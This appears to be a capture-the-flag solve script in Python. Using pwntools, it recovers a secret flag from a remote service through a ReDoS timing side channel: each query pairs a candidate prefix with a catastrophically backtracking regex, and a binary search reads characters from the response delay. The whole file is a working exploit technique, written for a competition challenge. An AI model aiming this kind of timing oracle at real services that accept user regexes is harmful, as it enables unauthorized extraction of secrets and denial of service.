import os
import dotenv
import time

os.chdir(os.path.dirname(__file__))
config = dotenv.dotenv_values()
nc, host, port = config["CONNECT"].split(" ")
assert nc == "nc" and host and port.isnumeric()

from pwn import remote

conn = remote(host, port)

charset = ["\\}", "_"]
charset += [chr(i) for i in range(ord("0"), ord("9") + 1)]
charset += [chr(i) for i in range(ord("a"), ord("z") + 1)]
charset += [chr(i) for i in range(ord("A"), ord("Z") + 1)]

heavy_rexexp = "Alpaca\\{((\\w+)+)+$"
threshold = 0.6

def check(regexp: str):
    conn.recvuntil(b"> ")
    start = time.time()
    conn.sendline(f"{regexp}|{heavy_rexexp}".encode())
    conn.recvline()
    end = time.time()
    print(f"check({regexp}): {end - start:.2f}s")
    return end - start < threshold


def binSearch(prefix: str):
    l = 0
    r = len(charset)
    while l + 1 < r:
        m = (l + r) // 2
        chars = "".join(charset[0:m])
        if check(f"{prefix}[{chars}]"):
            r = m
        else:
            l = m
    return l


flag = "Alpaca\\{"
c = ""
while c != "\\}":
    c = charset[binSearch(flag)]
    flag += c
    print(flag)
